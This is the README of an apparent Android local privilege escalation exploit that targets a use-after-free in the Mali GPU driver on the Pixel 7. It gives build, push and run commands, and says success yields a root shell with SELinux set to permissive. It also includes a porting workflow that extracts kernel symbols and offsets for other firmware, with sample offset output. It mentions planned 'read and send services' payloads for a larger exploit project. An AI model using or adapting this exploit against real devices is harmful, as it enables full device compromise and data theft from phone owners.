## Exploit
The vulnerability was introduced in the SPL 230305. This project is named after Timbuktu, a city in Mali as it exploits a UAF in the Mali GPU driver. The exploit may fail due to multiple race conditions and this causes the device to reboot. Observed success rate is ~70-80%.

It has currently only been tested on Pixel 7. Full list of potentially vulnerable devices can be found here:

```
https://www.gsmarena.com/results.php3?sFreeText=Mali-G710 
https://www.gsmarena.com/results.php3?sFreeText=Mali-G610
```
After successfully running the exploit, a root shell is spawned and SELinux is set to permissive mode on the device. In its current state, there is minimal effort required to integrate it into the LPE project. What is left to do is to spawn the final payloads (read and send services) and implement a vulnerable check.

## Running it

```
$ aarch64-linux-android33-clang exploit.c -o timbuktu
$ adb push timbuktu /data/local/tmp
$ adb shell
panther:/ $ /data/local/tmp/timbuktu {--exploit/--is-vulnerable}
```
`--is-vulnerable` will check if the Mali GPU driver is vulnerable and if the device firmware is supported. `--exploit` will attempt to exploit the vulnerability and it also checks if the device firmware is supported, i.e., specified in the `config.h` file, if it is not then the exploit will terminate.

## Development
There are some helpful scripts for exploit development in the dev folder.  The exploit is written to support different versions of kernels. In order to port the exploit to a different kernel, you need to extract the symbol file of the target kernel.

After downloading the stock firmware image, extract the image to get `boot.img` file. `boot.img` can be extracted with dev/unpack_bootimg.py:

```
python3 dev/unpack_bootimg.py --boot_img boot.img --out out
```

You will see the kernel extracted at `out/kernel`

Now, with the kernel image, we can use [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) to extract kernel symbols from it.

```
python3 </path/to>/vmlinux-to-elf/kallsyms-finder.py out/kernel > kallsyms
```

`extract_offsets.sh` can be executed in order to extract all the offsets needed for the exploit on a particular firmare. The output from such a run (shown below) can be copied into the config header file. Currently support has been added for the panther firmware for Pixel 7 and SPLs from 230305 to 230805. The fingerprint string (e.g., `.fingerprint = "google/panther/panther:13/TQ3A.230705.001/10216780:user/release-keys"`) can be found using the following command via adb:

```
adb shell getprop ro.vendor.build.fingerprint
```

Example output from running `extract_offsets.sh`:

```
$ chmod +x dev/extract_offsets.sh
$ ./dev/extract_offsets.sh kallsyms
.offset_kbase = 0x1A0F580,
.offset_sysctl_var = 0x2F09F60,
.offset_pipe_buf_ops = 0x237ACE8,
.offset_init_task = 0x302B0C0,
.offset_init_cred = 0x2FFFB58,
.offset_selinux_state = 0x3195958,
```

The `flash.sh` script is used to automatically flash an own kernel build to a device, see description in the `dev` folder for setup of the environment when building the kernel.
